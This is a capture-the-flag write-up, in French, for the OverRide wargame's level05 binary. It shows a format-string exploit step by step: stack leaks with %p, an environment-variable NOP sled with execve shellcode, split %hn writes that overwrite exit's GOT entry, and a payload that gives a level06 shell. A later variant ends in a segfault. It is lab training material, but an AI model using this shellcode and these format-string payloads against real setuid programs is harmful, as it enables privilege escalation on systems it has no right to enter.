iRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05

level05@OverRide:~$ file level05 
level05: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x1a9c02d3aeffff53ee0aa8c7730cbcb1ab34270e, not strippe

Le programme actuel recupere la string de gets et transforme les minuscules en majuscules.
Le premier argument du printf a *main+195 est notre string, ce qui correspond a une faille de type format string

level05@OverRide:~$ (python -c "print 'aaaa' + '%p ' * 30";cat) | ./level05
aaaa0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6df 0xffffd6de (nil) 0xffffffff 0xffffd764 0xf7fdb000 0x61616161 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070

Nous pouvons voir que notre string 'aaaa' apparait au printf access parameter numero 10

export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")

(gdb) x/s *((char **)environ+0)
0xffffd74a:      "EXPLOIT=<...>"

adresse exploit: 0xffffd74a
(gdb) p/d 0xffffd74a+200
$1 = 4294957074


(gdb) p/x 0xffffd74a+200
$2 = 0xffffd812
(gdb) x/s 0xffffd812

(gdb) p/d 0xd812
$4 = 55314
(gdb) p/d 0xd812-8
$5 = 55306

gdb-peda$ p/d 0xffff
$5 = 65535
(gdb) p/d 0xffff-55314
$6 = 10221

adresse exit: 0x80497e0

(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0x08048370  exit
0x08048370  exit@plt

Nous pouvons voir sur ce document, que les valeurs des int pris en compte par printf ont une limite :
https://cs155.stanford.edu/papers/formatstring-1.2.pdf

Comme a sa section 4.1 (Short write), nous allons passer notre adresse en deux fois afin de ne pas depasser cette limite.

=> 0x08048475 <+49>:    call   0x8048350 <fgets@plt> ; Size == 100
(gdb) x/wx $esp
0xffffd470:     0xffffd498
(gdb) x/s 0xffffd498
0xffffd498:      ""


(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%.55306u%10$hn" + "%.10221u%11$hn")'; cat) | ./level05
<...>
whoami
level06


(python -c 'print(len("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%.55306u%10$hn" + "%.10221u%11$hn"))')
34


p/d 100-8-23-13-13
$8 = 43 NOPs

Je recommence mes calculs avec un environnement vierge.

=> 0x08048475 <+49>:    call   0x8048350 <fgets@plt>
(gdb) x/wx $esp
0xffffd690:     0xffffd6b8
(gdb) x/s 0xffffd6b8
0xffffd6b8:      ""

(gdb) p/x 0xffffd6b8+8+21
$2 = 0xffffd6d5

(gdb) p/d 0xd6d5
$3 = 54997
(gdb) p/d 0xd6d5-8
$4 = 54989

(gdb) p/d 0xffff
$5 = 65535
(gdb) p/d 0xffff-54997
$6 = 10538

(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "\x90" * (100-8-23-13-13) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "%.54989u%10$hn" + "%.10538u%11$hn")'; cat) | ./level05
Segmentation fault (core dumped)

Je pense qu il ny a pas assez de NOPs de disponible afin de pouvoir etre sur qu une adresse arrive dans les NOPs.
